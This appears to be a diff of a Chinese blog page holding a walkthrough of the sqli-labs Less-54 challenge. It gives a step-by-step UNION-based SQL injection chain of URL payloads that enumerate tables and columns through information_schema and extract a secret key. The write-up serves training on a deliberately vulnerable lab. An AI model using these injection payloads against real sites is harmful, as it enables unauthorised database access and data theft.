@@ -6,15 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: pwn | Welcome to my blogs!</title>
+  <title>less54-65 | Welcome to my blogs!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Welcome to my blogs!">
-<meta property="og:url" content="http://yoursite.com/tags/pwn/index.html">
+  <meta name="description" content="less-54(无法连接到数据库：挑战未知数据库的“挑战”)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="less54-65">
+<meta property="og:url" content="http://yoursite.com/2020/11/02/less54-65/index.html">
 <meta property="og:site_name" content="Welcome to my blogs!">
+<meta property="og:description" content="less-54(无法连接到数据库：挑战未知数据库的“挑战”)">
 <meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-11-02T14:35:13.972Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Welcome to my blogs!">
+<meta name="twitter:title" content="less54-65">
+<meta name="twitter:description" content="less-54(无法连接到数据库：挑战未知数据库的“挑战”)">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to my blogs!" type="application/atom+xml">
   
@@ -150,113 +154,223 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-less54-65" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/03/level5/" class="archive-article-date">
-  	<time datetime="2019-10-03T09:02:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-03</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/03/level5/">level5</a>
+    <h1 class="article-title" itemprop="name">
+      less54-65
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">libc泄露</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/01/pwn-hello/" class="archive-article-date">
-  	<time datetime="2019-10-01T08:50:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-01</time>
+        
+        <a href="/2020/11/02/less54-65/" class="archive-article-date">
+  	<time datetime="2020-11-02T14:26:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-02</time>
 </a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3>less-54(无法连接到数据库：挑战未知数据库的“挑战”)</h3>
+<a id="more"></a>
+<p>
+我的不知道怎么回事怎么都没用
+就掏国光的了
+</p>
+<h3>Less-54</h3>
+<p>
+请求方式        注入类型                拼接方式
+GET        联合、布尔盲注、延时盲注        id='$id'
+</p>
+
+<h4>简单源码分析：</h4>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">if reset:</span><br><span class="line">    # 根据时间戳生成 cookie</span><br><span class="line">    setcookie(&apos;challenge&apos;, &apos; &apos;, time() - 3600000);</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">    if cookie 中有 challenge:</span><br><span class="line">        $sessid=$_COOKIE[&apos;challenge&apos;];</span><br><span class="line">    else:</span><br><span class="line">        # 生成 cookie </span><br><span class="line">        $expire = time()+60*60*24*30;</span><br><span class="line">        $hash = data($table,$col);</span><br><span class="line">        setcookie(&quot;challenge&quot;, $hash, $expire);</span><br><span class="line">    if $_GET[&apos;id&apos;]:</span><br><span class="line">        计数器 + 1</span><br><span class="line">        $sql=&quot;SELECT * FROM security.users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">    if 有查询成功:</span><br><span class="line">        输出查询信息</span><br><span class="line">    else：</span><br><span class="line">        啥都不输出</span><br><span class="line"></span><br><span class="line"># key 被双重过滤了</span><br><span class="line">$key = addslashes($_POST[&apos;key&apos;]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line">$sql=&quot;SELECT 1 FROM $table WHERE $col1= &apos;$key&apos;&quot;;</span><br></pre></td></tr></table></figure>
+<p>
+代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：
+</p>
+<p>
+判断闭合方式
+Payload
+?id=1'--+
+</p>
+<p>
+判断字段数
+Payload
+?id=1' order by 3--+
+?id=1' order by 4--+
+</p>
+<p>
+查询有可注入的字段
+Payload
+?id=-1' union select 1,2,3 --+
+字段数 2,3
+</p>
+<p>
+查询表名**
+Payload
+?id=-1' union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()) --+
+表名为：KMA0E2Z29V ，这个表名可能是随机的 不同用户不一样
+</p>
+<p>
+查询列名
+Payload
+?id=-1' union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x4b4d413045325a323956)--+
+查到列名如下：id、sessid、secret_1XVB、tryy
+</p>
+<p>
+查询字段值
+Payload
+?id=-1' union select 1,2,(SELECT+GROUP_CONCAT(secret_1XVB)+FROM+KMA0E2Z29V)--+
+拿到 key 值为：UNK985xGrJL5PIWKGogHXo3F
+</p>
+<p>
+总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。
+</p>
+文章参考链接:<a href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-75" target="_blank" rel="noopener"> https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-75</a>
+
+<h3>less-55</h3>
+<p>
+................................................................................
+结束，我链接不了！
+Unable to connect to the database: challengesUnknown database 'challenges'
+
+</p><p>原来缺少challenges数据库，得创建一下</p>
+<p>额，接下来，国光<a href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-99
+" target="_blank" rel="noopener">https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-99<br></a>伴随你，我拒绝搞了</p>
+<p></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>十分感谢<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/01/pwn-hello/">pwn hello</a>
-    </h1>
-  
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
+      
 
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PWN//" class="article-tag-list-link color4">PWN</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/11/02/less54-65/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/11/02/less46-50/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">less46-53</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -287,9 +401,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
